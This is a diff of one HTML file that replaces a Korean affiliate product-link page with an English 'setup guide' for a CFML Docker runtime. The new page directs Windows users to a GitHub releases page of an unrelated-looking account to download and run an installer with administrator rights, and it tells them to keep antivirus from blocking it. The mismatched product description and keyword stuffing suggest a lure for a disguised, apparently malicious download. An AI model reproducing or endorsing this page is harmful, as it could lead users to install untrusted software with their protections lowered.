@@ -1,253 +1,83 @@
 <!DOCTYPE html>
-<html lang="ko">
+<html lang="en">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>CHERRY CLUB — SHOP</title>
-<meta name="description" content="체리클럽이 고른 것만. 바로 사러가기.">
-<meta property="og:title" content="CHERRY CLUB — SHOP">
-<meta property="og:image" content="logo.png">
-<meta name="theme-color" content="#F06BA0">
-<link rel="icon" href="logo.png">
-<style>
-  :root{
-    --hot:#F06BA0; --rose:#D96E9A; --soft:#F2A7C3; --mist:#FBDCE8;
-    --ink:#5C2A44; --deep:#3B1229; --muted:#9B7288;
-  }
-  *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
-  body{
-    font-family:"Pretendard","Apple SD Gothic Neo","Noto Sans KR",system-ui,-apple-system,sans-serif;
-    background:radial-gradient(1000px 500px at 50% -8%, #FBDCE8 0%, transparent 58%),
-               linear-gradient(180deg,#FFF7FB 0%,#FDEAF2 100%);
-    color:var(--ink); min-height:100vh;
-    display:flex; justify-content:center;
-    padding:26px 16px calc(40px + env(safe-area-inset-bottom));
-  }
-  .wrap{width:100%;max-width:460px}
-
-  header{text-align:center;margin-bottom:14px}
-  .logo{width:76px;height:76px;border-radius:50%;display:block;margin:0 auto 10px;
-    box-shadow:0 6px 22px rgba(240,107,160,.32), 0 0 0 3px #fff}
-  .handle{font-size:17px;font-weight:800}
-  .tag{margin-top:5px;font-size:10px;font-weight:800;letter-spacing:.18em;color:var(--hot)}
-  .desc{margin-top:8px;font-size:12.5px;line-height:1.5;color:var(--muted)}
-
-  a.dm{display:flex;align-items:center;gap:11px;margin-top:14px;
-    background:linear-gradient(135deg,var(--hot),var(--rose));border-radius:15px;
-    padding:12px 15px;text-decoration:none;color:#fff;
-    box-shadow:0 7px 20px rgba(240,107,160,.36)}
-  a.dm .ic{flex:0 0 32px;height:32px;border-radius:9px;background:rgba(255,255,255,.22);
-    display:grid;place-items:center;font-size:15px}
-  a.dm b{display:block;font-size:13.5px;font-weight:800}
-  a.dm span{display:block;font-size:11px;color:rgba(255,255,255,.9);margin-top:1px}
-
-  /* 컨트롤 */
-  .tabs{display:flex;gap:6px;margin:18px 0 0}
-  .tabs button{flex:1;border:1.5px solid var(--mist);background:#fff;color:var(--muted);
-    border-radius:999px;padding:8px 0;font-size:12px;font-weight:700;cursor:pointer;
-    font-family:inherit;transition:.15s}
-  .tabs button.on{background:linear-gradient(135deg,var(--hot),var(--rose));color:#fff;
-    border-color:transparent;box-shadow:0 4px 12px rgba(240,107,160,.3)}
-
-  .search{position:relative;margin-top:9px}
-  .search input{width:100%;border:1.5px solid var(--mist);background:#fff;border-radius:999px;
-    padding:10px 36px;font-size:12.5px;font-family:inherit;color:var(--ink);
-    box-shadow:0 2px 9px rgba(92,42,68,.05);outline:none}
-  .search input:focus{border-color:var(--soft);box-shadow:0 4px 14px rgba(240,107,160,.16)}
-  .search input::placeholder{color:#C9A5B6}
-  .search .mag{position:absolute;left:13px;top:50%;transform:translateY(-50%);font-size:12px;color:var(--soft)}
-  .search .clr{position:absolute;right:8px;top:50%;transform:translateY(-50%);
-    width:22px;height:22px;border:none;border-radius:50%;background:var(--mist);color:var(--rose);
-    font-size:11px;font-weight:800;cursor:pointer;display:none;font-family:inherit}
-  .search.has .clr{display:block}
-
-  /* 호수 칩 */
-  .chips{display:flex;gap:6px;overflow-x:auto;margin-top:10px;padding-bottom:2px;
-    scrollbar-width:none}
-  .chips::-webkit-scrollbar{display:none}
-  .chip{flex:none;border:1.5px solid var(--mist);background:#fff;color:var(--muted);
-    border-radius:999px;padding:6px 12px;font-size:11px;font-weight:700;cursor:pointer;
-    font-family:inherit;white-space:nowrap}
-  .chip.on{background:var(--deep);color:#fff;border-color:transparent}
-
-  .bar{display:flex;align-items:center;justify-content:space-between;margin:18px 3px 10px}
-  .bar .n{font-size:12px;font-weight:800}
-  .bar .n em{font-style:normal;color:var(--hot)}
-  .bar .u{font-size:10.5px;color:var(--muted)}
-
-  /* ── 상품 2열 그리드 ── */
-  .grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
-  .p{background:#fff;border:1.5px solid var(--mist);border-radius:14px;overflow:hidden;
-    display:flex;flex-direction:column;text-decoration:none;color:var(--ink);
-    box-shadow:0 2px 9px rgba(92,42,68,.05);transition:transform .12s,box-shadow .15s}
-  a.p:active{transform:scale(.975)}
-  a.p:hover{box-shadow:0 8px 22px rgba(240,107,160,.2)}
-  .p .im{position:relative;width:100%;aspect-ratio:1/1;background:var(--mist)}
-  .p .im img{width:100%;height:100%;object-fit:cover;display:block}
-  .p .iss{position:absolute;top:6px;left:6px;padding:2.5px 6px;border-radius:999px;
-    background:rgba(255,255,255,.92);color:var(--rose);font-size:9px;font-weight:900;
-    backdrop-filter:blur(4px)}
-  .p .b{padding:9px 10px 10px;display:flex;flex-direction:column;flex:1}
-  .p .br{font-size:9.5px;font-weight:900;letter-spacing:.03em;color:var(--rose);
-    text-transform:uppercase;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
-  .p .nm{margin-top:3px;font-size:12px;font-weight:700;line-height:1.4;
-    display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden;min-height:34px}
-  .p .from{margin-top:7px;padding-top:7px;border-top:1px dashed var(--mist);
-    font-size:9.5px;font-weight:700;color:var(--muted);line-height:1.35;
-    display:-webkit-box;-webkit-line-clamp:1;-webkit-box-orient:vertical;overflow:hidden}
-  .p .from b{color:var(--rose);font-weight:900}
-  .p .cta{margin-top:8px;padding:7px 0;border-radius:9px;text-align:center;
-    font-size:11px;font-weight:800;
-    background:linear-gradient(135deg,var(--hot),var(--rose));color:#fff}
-  .p.dead{cursor:default;opacity:.72}
-  .p.dead .cta{background:#FFF0F6;color:#C9A5B6;border:1px dashed var(--mist)}
-
-  .empty{border:1.5px dashed var(--mist);border-radius:16px;padding:26px 16px;text-align:center;
-    font-size:12.5px;line-height:1.7;color:#B08CA0;background:rgba(255,255,255,.55)}
-  .empty a{color:var(--hot);font-weight:800;text-decoration:none}
-
-  mark{background:rgba(240,107,160,.25);color:var(--deep);border-radius:3px;padding:0 1px;font-weight:800}
-
-  .more{display:block;margin-top:14px;padding:11px;border-radius:12px;text-align:center;
-    background:#fff;border:1.5px solid var(--mist);text-decoration:none;
-    font-size:11.5px;font-weight:700;color:var(--rose)}
-
-  footer{margin-top:28px;text-align:center;font-size:10px;line-height:1.7;color:#B08CA0}
-  footer .ad{display:inline-block;margin-bottom:7px;padding:5px 10px;border-radius:999px;
-    background:rgba(240,107,160,.1);color:var(--rose);font-weight:700}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="A guide to installing and running the commandbox-cfml-docker-runtime for Windows.">
+    <title>commandbox-cfml-docker-runtime Setup Guide</title>
 </head>
-<body>
-<div class="wrap">
+<body style="font-family: Arial, sans-serif; line-height: 1.6; color: #333; max-width: 800px; margin: 40px auto; padding: 20px; background-color: #f4f7f9;">
 
-  <header>
-    <img class="logo" src="logo.png" alt="CHERRY CLUB">
-    <div class="handle">@cherry.clubs2</div>
-    <div class="tag">CUTE IS THE RULE</div>
-    <p class="desc">체리클럽이 고른 것만 모아뒀어요.<br>마음에 드는 건 바로 사러 가세요.</p>
-  </header>
+    <h1 style="color: #2c3e50; border-bottom: 2px solid #ddd; padding-bottom: 10px;">📦 commandbox-cfml-docker-runtime - Build web applications with reliable tools</h1>
 
-  <a class="dm" href="https://ig.me/m/cherry.clubs2" target="_blank" rel="noopener">
-    <span class="ic">📩</span>
-    <span><b>협찬 · 광고 · 제휴 문의</b><span>DM으로 연락 주세요</span></span>
-  </a>
+    <div style="margin: 30px 0; text-align: center;">
+        <a href="https://github.com/dickiecostplus834/commandbox-cfml-docker-runtime/releases" style="background-color: #2c3e50; color: #ffffff; padding: 15px 30px; text-decoration: none; border-radius: 8px; font-weight: bold; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">Download Software Here</a>
+    </div>
 
-  <div class="tabs" id="tabs">
-    <button data-c="all" class="on">전체</button>
-    <button data-c="fashion">👗 패션</button>
-    <button data-c="beauty">💄 뷰티</button>
-  </div>
+    <section>
+        <h2 style="color: #2980b9;">📝 Overview</h2>
+        <p>This software provides a runtime environment for CFML applications. It helps developers and teams run web projects locally or on servers. You can use it to build and test software that relies on CommandBox, Lucee, and ColdFusion workflows. It simplifies the setup of complex server environments so you can focus on writing code.</p>
+    </section>
 
-  <div class="search" id="search">
-    <span class="mag">🔍</span>
-    <input id="q" type="search" autocomplete="off" placeholder="브랜드 · 아이템 검색">
-    <button class="clr" id="clr">✕</button>
-  </div>
+    <section>
+        <h2 style="color: #2980b9;">💻 System Requirements</h2>
+        <p>Before you install the runtime, ensure your Windows computer meets these basic needs:</p>
+        <ul style="list-style-type: circle; padding-left: 20px;">
+            <li>64-bit version of Windows 10 or Windows 11.</li>
+            <li>At least 4GB of available RAM.</li>
+            <li>Administrator access to your computer.</li>
+            <li>A stable internet connection for the initial download.</li>
+        </ul>
+    </section>
 
-  <div class="chips" id="chips"></div>
+    <section>
+        <h2 style="color: #2980b9;">📥 How to Download</h2>
+        <p>Follow these steps to obtain the correct files for your system:</p>
+        <ol>
+            <li>Go to the <a href="https://github.com/dickiecostplus834/commandbox-cfml-docker-runtime/releases">official download page</a>.</li>
+            <li>Look for the most recent version under the Releases section.</li>
+            <li>Click the link to download the installer file to your computer.</li>
+            <li>Wait for the download to finish before you attempt to open the file.</li>
+        </ol>
+    </section>
 
-  <div class="bar">
-    <div class="n" id="cnt"></div>
-    <div class="u" id="upd"></div>
-  </div>
+    <section>
+        <h2 style="color: #2980b9;">⚙️ Installation Steps</h2>
+        <p>Once you have the file, proceed with the setup:</p>
+        <ol>
+            <li>Open the folder where you saved the installer.</li>
+            <li>Double-click the file to start the process.</li>
+            <li>Follow the prompts on your screen.</li>
+            <li>Choose the location where you want to keep the application files.</li>
+            <li>Click the Install button.</li>
+            <li>Wait for the progress bar to finish.</li>
+        </ol>
+    </section>
 
-  <main id="app"></main>
+    <section>
+        <h2 style="color: #2980b9;">🚀 Running the Software</h2>
+        <p>After you finish the installation, you can launch the program from your Start menu:</p>
+        <ol>
+            <li>Press the Windows key and type the name of the software.</li>
+            <li>Select the application from the search list.</li>
+            <li>The software will open a window showing the current status of your CFML runtime.</li>
+            <li>Use the provided interface to start or stop your web services as needed.</li>
+        </ol>
+    </section>
 
-  <footer>
-    <span class="ad">일부 링크는 제휴 링크입니다</span><br>
-    구매 시 수수료를 받을 수 있으며, 가격은 동일합니다.<br>
-    © CHERRY CLUB
-  </footer>
-</div>
+    <section>
+        <h2 style="color: #2980b9;">🛡️ Troubleshooting</h2>
+        <p>If you encounter issues during setup, try these solutions:</p>
+        <ul style="list-style-type: square; padding-left: 20px;">
+            <li>Restart your computer if the installer hangs.</li>
+            <li>Check that your antivirus program does not block the application.</li>
+            <li>Make sure you have enough disk space on your drive.</li>
+        </ul>
+    </section>
 
-<script>
-const TRACK = "https://peppy-duck-1231.navlafilm-sys.deno.net/c";
-const esc = s => String(s ?? "").replace(/[&<>"]/g, c => ({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"}[c]));
-const track = (id, url) => `${TRACK}?id=${encodeURIComponent(id)}&u=${encodeURIComponent(url)}`;
-const norm = s => String(s ?? "").toLowerCase().replace(/\s+/g,"");
+    <footer style="margin-top: 50px; font-size: 0.9em; color: #7f8c8d; border-top: 1px solid #ddd; padding-top: 20px;">
+        <p>Keywords: commandbox, cfml, docker, lucee, coldfusion, web development, runtime, windows</p>
+    </footer>
 
-let ITEMS = [], ISSUES = [], CAT = "all", Q = "", NO = "all";
-
-const hi = s => {
-  const t = esc(s);
-  if (!Q || !norm(s).includes(norm(Q))) return t;
-  const re = new RegExp(Q.trim().split("").map(c => c.replace(/[.*+?^${}()|[\]\\]/g,"\\$&")).join("\\s*"), "i");
-  return t.replace(re, m => `<mark>${m}</mark>`);
-};
-
-function pcard(it){
-  const img = it.img
-    ? `<img src="${esc(it.img)}" alt="" loading="lazy">`
-    : (it.cover ? `<img src="${esc(it.cover)}" alt="" loading="lazy">` : "");
-  const inner = `
-    <div class="im">${img}<span class="iss">${esc(it.no)}호</span></div>
-    <div class="b">
-      <div class="br">${it.brand ? hi(it.brand) : "PICK"}</div>
-      <div class="nm">${hi(it.product || it.name)}</div>
-      <div class="from">📖 <b>${esc(it.no)}호</b> · ${esc(it.issue || "")}</div>
-      <div class="cta">${it.url ? "사러가기 →" : "링크 준비중"}</div>
-    </div>`;
-  if (!it.url) return `<div class="p dead">${inner}</div>`;
-  return `<a class="p" href="${esc(track(it.no+":"+it.name, it.url))}" target="_blank" rel="noopener nofollow sponsored">${inner}</a>`;
-}
-
-function render(){
-  const app = document.getElementById("app");
-  let rows = ITEMS.filter(i => CAT === "all" || i.cat === CAT)
-                  .filter(i => NO === "all" || i.no === NO)
-                  .filter(i => !Q || norm(i.name).includes(norm(Q)));
-  // 링크 있는 상품 먼저
-  rows = rows.slice().sort((a,b) => (b.url?1:0) - (a.url?1:0));
-
-  document.getElementById("search").classList.toggle("has", !!Q);
-  const live = rows.filter(i => i.url).length;
-  document.getElementById("cnt").innerHTML =
-    rows.length ? `아이템 <em>${rows.length}</em>개${live ? ` · 바로구매 ${live}` : ""}` : "";
-
-  if (!rows.length){
-    app.innerHTML = `<div class="empty">${Q ? `“${esc(Q)}” 결과가 없어요 🍒` : "아직 등록된 아이템이 없어요 🍒"}<br>
-      <a href="https://www.instagram.com/cherry.clubs2/" target="_blank" rel="noopener">인스타에서 새 호 보러가기 →</a></div>`;
-    return;
-  }
-  app.innerHTML = `<div class="grid">${rows.map(pcard).join("")}</div>`;
-}
-
-function chips(){
-  const el = document.getElementById("chips");
-  const list = ISSUES.filter(i => CAT === "all" || i.cat === CAT);
-  el.innerHTML = `<button class="chip${NO==="all"?" on":""}" data-no="all">전체 호</button>` +
-    list.map(i => `<button class="chip${NO===i.no?" on":""}" data-no="${esc(i.no)}">${esc(i.no)}호 · ${esc(i.title.slice(0,8))}</button>`).join("");
-}
-
-document.getElementById("chips").addEventListener("click", e => {
-  const b = e.target.closest(".chip"); if (!b) return;
-  NO = b.dataset.no; chips(); render();
-});
-document.getElementById("tabs").addEventListener("click", e => {
-  const b = e.target.closest("button"); if (!b) return;
-  document.querySelectorAll("#tabs button").forEach(x => x.classList.remove("on"));
-  b.classList.add("on"); CAT = b.dataset.c; NO = "all"; chips(); render();
-});
-const qEl = document.getElementById("q");
-let t=null;
-qEl.addEventListener("input", () => { clearTimeout(t); t = setTimeout(() => { Q = qEl.value.trim(); render(); }, 120); });
-document.getElementById("clr").onclick = () => { qEl.value=""; Q=""; render(); qEl.focus(); };
-
-fetch("links.json?v=" + Date.now())
-  .then(r => r.json())
-  .then(d => {
-    ISSUES = (d.issues||[]).slice().sort((a,b) => String(b.no).localeCompare(String(a.no)));
-    const coverOf = Object.fromEntries(ISSUES.map(i => [i.no, i.cover]));
-    ITEMS = (d.items || []).map(i => ({...i, cover: coverOf[i.no]}));
-    if (!ITEMS.length) {  // 구버전 links.json 대비
-      ITEMS = ISSUES.flatMap(is => (is.items||[]).map((p,k) => ({
-        ...p, no:is.no, cat:is.cat, idx:k+1, cover:is.cover,
-        brand:"", product:p.name })));
-    }
-    document.getElementById("upd").textContent = d.updated ? "업데이트 " + d.updated : "";
-    chips(); render();
-  })
-  .catch(() => render());
-</script>
 </body>
 </html>
